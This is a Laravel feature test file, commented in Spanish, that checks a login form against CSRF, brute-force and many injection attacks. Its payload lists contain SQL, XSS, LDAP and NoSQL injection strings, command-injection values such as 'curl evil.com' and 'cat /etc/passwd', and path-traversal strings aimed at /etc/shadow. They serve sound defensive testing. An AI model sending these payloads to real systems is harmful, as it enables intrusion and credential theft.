<?php

namespace Tests\Feature;

use Tests\TestCase;
use App\Models\User;
use App\Models\Role;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Cache;

class LoginAttackTest extends TestCase
{
    use RefreshDatabase;

    protected $user;
    protected $activeRole;

    protected function setUp(): void
    {
        parent::setUp();
        
        $this->activeRole = Role::create([
            'name' => 'Usuario Activo',
            'is_active' => true
        ]);

        $this->user = User::create([
            'name' => 'Usuario de Prueba',
            'email' => 'test@example.com',
            'password' => Hash::make('password123'),
            'role_id' => $this->activeRole->id,
            'is_active' => true
        ]);

        RateLimiter::clear('login');
        Cache::flush();
    }

    /**
     * Test de protección CSRF - sin token
     */
    public function test_proteccion_csrf_sin_token()
    {
        $response = $this->post('/login', [
            'email' => 'test@example.com',
            'password' => 'password123'
        ]);

        $this->assertTrue(in_array($response->status(), [419, 302]));
        if ($response->status() === 302) {
            $this->assertNotEquals('/panel', $response->headers->get('Location'));
        } else {
            $this->assertGuest();
        }
    }

    /**
     * Test de protección CSRF - token inválido
     */
    public function test_proteccion_csrf_token_invalido()
    {
        $response = $this->post('/login', [
            'email' => 'test@example.com',
            'password' => 'password123',
            '_token' => 'token_invalido'
        ]);

        $this->assertTrue(in_array($response->status(), [419, 302]));
        if ($response->status() === 302) {
            $this->assertNotEquals('/panel', $response->headers->get('Location'));
        } else {
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra fuerza bruta
     */
    public function test_proteccion_fuerza_bruta()
    {
        $maxIntentos = 5;
        
        // Realizar múltiples intentos de login fallidos
        for ($i = 0; $i < $maxIntentos; $i++) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'contrasena_incorrecta',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }

        // El siguiente intento debería estar bloqueado por rate limiting
        $response = $this->post('/login', [
            'email' => 'test@example.com',
            'password' => 'password123', // Contraseña correcta
            '_token' => csrf_token()
        ]);

        // Debería estar bloqueado por rate limiting o redirigir
        $this->assertTrue(in_array($response->status(), [429, 302]));
        $this->assertGuest();
    }

    /**
     * Test de protección contra inyección SQL en email
     */
    public function test_proteccion_inyeccion_sql_email()
    {
        $payloadsInyeccionSQL = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "1' OR '1'='1' AND '1'='1",
            "1' OR '1'='1' LIMIT 1--",
            "1' UNION SELECT * FROM users--",
            "1' UNION SELECT email,password FROM users--",
            "1' OR '1'='1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' OR '1'='1' AND (SELECT SLEEP(5) FROM users LIMIT 1)--",
        ];

        foreach ($payloadsInyeccionSQL as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra inyección SQL en contraseña
     */
    public function test_proteccion_inyeccion_sql_contrasena()
    {
        $payloadsInyeccionSQL = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "password'--",
            "password'/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "1' OR '1'='1' AND '1'='1",
            "1' OR '1'='1' LIMIT 1--",
            "1' UNION SELECT * FROM users--",
            "1' OR '1'='1' AND (SELECT COUNT(*) FROM users) > 0--",
        ];

        foreach ($payloadsInyeccionSQL as $payload) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => $payload,
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra ataques XSS
     */
    public function test_proteccion_ataques_xss()
    {
        $payloadsXSS = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert("xss")>',
            '"onmouseover="alert(\'xss\')"',
            '\';alert("xss");//',
            '<svg onload=alert("xss")>',
            'javascript:alert("xss")',
            'data:text/html,<script>alert("xss")</script>',
            'vbscript:alert("xss")',
        ];

        foreach ($payloadsXSS as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra ataques LDAP
     */
    public function test_proteccion_ataques_ldap()
    {
        $payloadsLDAP = [
            '*',
            '*)(&',
            '*)(|',
            '*)(|(password=*',
            '*)(|(objectClass=*',
            '*)(|(cn=*',
            '*)(|(uid=*',
            '*)(|(mail=*',
            '*)(|(userPassword=*',
            '*)(|(sAMAccountName=*',
        ];

        foreach ($payloadsLDAP as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra ataques NoSQL
     */
    public function test_proteccion_ataques_nosql()
    {
        $payloadsNoSQL = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.password == this.password"}',
            '{"$where": "this.password.length > 0"}',
            '{"selector": {"password": {"$ne": null}}}',
            '{"selector": {"password": {"$gt": ""}}}',
            '{"query": {"match_all": {}}}',
        ];

        foreach ($payloadsNoSQL as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra inyección de comandos
     */
    public function test_proteccion_inyeccion_comandos()
    {
        $payloadsComando = [
            'test@example.com; ls -la',
            'test@example.com | cat /etc/passwd',
            'test@example.com && whoami',
            'test@example.com || id',
            'test@example.com`whoami`',
            'test@example.com$(id)',
            'test@example.com; curl evil.com',
            'test@example.com; wget evil.com',
        ];

        foreach ($payloadsComando as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra path traversal
     */
    public function test_proteccion_path_traversal()
    {
        $payloadsPathTraversal = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../../etc/shadow',
            '..\\..\\..\\..\\boot.ini',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
        ];

        foreach ($payloadsPathTraversal as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra buffer overflow
     */
    public function test_proteccion_buffer_overflow()
    {
        $payloadsBufferOverflow = [
            str_repeat('a', 10000) . '@example.com',
            str_repeat('b', 50000) . '@example.com',
            str_repeat('c', 100000) . '@example.com',
        ];

        foreach ($payloadsBufferOverflow as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra ataques Unicode
     */
    public function test_proteccion_ataques_unicode()
    {
        $payloadsUnicode = [
            'tëst@example.com',
            'tëst@ëxämplë.com',
            'tëst@ëxämplë.çom',
            'tëst@ëxämplë.ñet',
            'tëst@ëxämplë.örg',
        ];

        foreach ($payloadsUnicode as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra caracteres de control
     */
    public function test_proteccion_caracteres_control()
    {
        $caracteresControl = [
            "test\x00@example.com",
            "test\x01@example.com",
            "test\x02@example.com",
            "test\x03@example.com",
            "test\x04@example.com",
            "test\x05@example.com",
            "test\x06@example.com",
            "test\x07@example.com",
            "test\x08@example.com",
            "test\x09@example.com",
            "test\x0A@example.com",
            "test\x0B@example.com",
            "test\x0C@example.com",
            "test\x0D@example.com",
            "test\x0E@example.com",
            "test\x0F@example.com",
        ];

        foreach ($caracteresControl as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra caracteres de escape
     */
    public function test_proteccion_caracteres_escape()
    {
        $caracteresEscape = [
            'test\\@example.com',
            'test\\"@example.com',
            "test\\'@example.com",
            'test\\n@example.com',
            'test\\r@example.com',
            'test\\t@example.com',
            'test\\0@example.com',
            'test\\x00@example.com',
            'test\\x1a@example.com',
        ];

        foreach ($caracteresEscape as $payload) {
            $response = $this->post('/login', [
                'email' => $payload,
                'password' => 'password123',
                '_token' => csrf_token()
            ]);

            $response->assertSessionHasErrors(['email']);
            $this->assertGuest();
        }
    }

    /**
     * Test de protección contra diferentes tipos de contenido
     */
    public function test_proteccion_diferentes_tipos_contenido()
    {
        $tiposContenido = [
            'application/json',
            'application/xml',
            'text/plain',
            'multipart/form-data',
            'application/x-www-form-urlencoded',
        ];

        foreach ($tiposContenido as $tipoContenido) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                'CONTENT_TYPE' => $tipoContenido
            ]);

            $this->assertTrue(
                in_array($response->status(), [419, 405, 422, 302])
            );
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes User-Agents
     */
    public function test_proteccion_diferentes_user_agents()
    {
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'curl/7.68.0',
            'wget/1.20.3',
            'python-requests/2.25.1',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        ];

        foreach ($userAgents as $userAgent) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                'HTTP_USER_AGENT' => $userAgent
            ]);

            $this->assertTrue(in_array($response->status(), [419, 302]));
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes referrers
     */
    public function test_proteccion_diferentes_referrers()
    {
        $referrers = [
            'https://example.com',
            'https://malicious-site.com',
            'https://another-site.com',
            'http://localhost:3000',
            'https://subdomain.example.com',
            'https://example.com/path/to/page',
            'https://example.com?param=value',
            'https://example.com#fragment',
        ];

        foreach ($referrers as $referrer) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                'HTTP_REFERER' => $referrer
            ]);

            $this->assertTrue(in_array($response->status(), [419, 302]));
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes origins
     */
    public function test_proteccion_diferentes_origins()
    {
        $origins = [
            'https://example.com',
            'https://malicious-site.com',
            'https://another-site.com',
            'http://localhost:3000',
            'https://subdomain.example.com',
        ];

        foreach ($origins as $origin) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                'HTTP_ORIGIN' => $origin
            ]);

            $this->assertTrue(in_array($response->status(), [419, 302]));
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes IPs
     */
    public function test_proteccion_diferentes_ips()
    {
        $ips = [
            '192.168.1.1',
            '192.168.1.2',
            '10.0.0.1',
            '172.16.0.1',
            '8.8.8.8',
            '1.1.1.1',
            '127.0.0.1',
            '::1',
        ];

        foreach ($ips as $ip) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                'HTTP_X_FORWARDED_FOR' => $ip,
                'REMOTE_ADDR' => $ip
            ]);

            $this->assertTrue(in_array($response->status(), [419, 302]));
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes métodos HTTP
     */
    public function test_proteccion_diferentes_metodos_http()
    {
        $metodos = ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'];

        foreach ($metodos as $metodo) {
            $response = $this->call($metodo, '/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ]);

            $this->assertTrue(in_array($response->status(), [405, 302, 200]));
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } elseif ($response->status() === 200) {
                $this->assertGuest();
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes headers
     */
    public function test_proteccion_diferentes_headers()
    {
        $headers = [
            'HTTP_X_CSRF_TOKEN' => 'fake-token',
            'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest',
            'HTTP_X_FORWARDED_FOR' => '192.168.1.1',
            'HTTP_X_REAL_IP' => '192.168.1.2',
            'HTTP_CLIENT_IP' => '192.168.1.3',
            'HTTP_X_FORWARDED_PROTO' => 'https',
            'HTTP_X_FORWARDED_HOST' => 'example.com',
            'HTTP_X_FORWARDED_PORT' => '443',
        ];

        foreach ($headers as $header => $value) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                $header => $value
            ]);

            $this->assertTrue(in_array($response->status(), [419, 302]));
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes tipos de archivos
     */
    public function test_proteccion_diferentes_tipos_archivos()
    {
        $tiposArchivos = [
            'image/jpeg',
            'image/png',
            'image/gif',
            'application/pdf',
            'text/plain',
            'application/zip',
            'application/x-executable',
            'application/x-sharedlib',
        ];

        foreach ($tiposArchivos as $tipoArchivo) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                'CONTENT_TYPE' => $tipoArchivo
            ]);

            $this->assertTrue(
                in_array($response->status(), [419, 405, 422, 302])
            );
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes tipos de encoding
     */
    public function test_proteccion_diferentes_tipos_encoding()
    {
        $encodings = [
            'gzip',
            'deflate',
            'br',
            'identity',
            'compress',
        ];

        foreach ($encodings as $encoding) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                'HTTP_ACCEPT_ENCODING' => $encoding
            ]);

            $this->assertTrue(in_array($response->status(), [419, 302]));
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }

    /**
     * Test de protección contra diferentes tipos de idioma
     */
    public function test_proteccion_diferentes_tipos_idioma()
    {
        $idiomas = [
            'en-US,en;q=0.9',
            'es-ES,es;q=0.9',
            'fr-FR,fr;q=0.9',
            'de-DE,de;q=0.9',
            'it-IT,it;q=0.9',
            'pt-BR,pt;q=0.9',
            'ru-RU,ru;q=0.9',
            'zh-CN,zh;q=0.9',
            'ja-JP,ja;q=0.9',
            'ko-KR,ko;q=0.9',
        ];

        foreach ($idiomas as $idioma) {
            $response = $this->post('/login', [
                'email' => 'test@example.com',
                'password' => 'password123'
            ], [
                'HTTP_ACCEPT_LANGUAGE' => $idioma
            ]);

            $this->assertTrue(in_array($response->status(), [419, 302]));
            if ($response->status() === 302) {
                $this->assertNotEquals('/panel', $response->headers->get('Location'));
            } else {
                $this->assertGuest();
            }
        }
    }
}